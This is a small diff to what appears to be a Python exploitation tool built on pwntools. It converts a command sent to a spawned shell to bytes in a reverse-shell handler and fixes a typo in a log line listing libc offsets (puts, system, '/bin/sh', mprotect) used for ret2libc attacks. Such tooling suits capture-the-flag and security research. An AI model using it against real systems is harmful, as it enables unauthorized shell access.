@@ -32,7 +32,7 @@ def handleReverseShell():
     # Check if shell was sucessfully executed
     noEOF = True
     try:
-        proc.sendline("ls"+" 2>&1")
+        proc.sendline(b"ls"+b" 2>&1")
         print(proc.recv(timeout = 0.1).decode('utf-8'))
     except EOFError:
         noEOF = False
@@ -335,7 +335,7 @@ def getLibcSymbolOffsets(libcJson):
     bin_shOff = symbolJson['symbols'].get('str_bin_sh')
     print()
     log.info("Trying offsets for libc version: "+libId)
-    log.info(f"Offsets - puts: {putsOff}, system: {systemOff}, str_bin_sh: {bin_shOff}, exit: {exitOff}, mprotext: {mprotectOff}, printf: {printfOff}")
+    log.info(f"Offsets - puts: {putsOff}, system: {systemOff}, str_bin_sh: {bin_shOff}, exit: {exitOff}, mprotect: {mprotectOff}, printf: {printfOff}")
     return putsOff, systemOff, exitOff, bin_shOff, mprotectOff, printfOff
 
 # Find the offset of the string '%x' from the current libc json
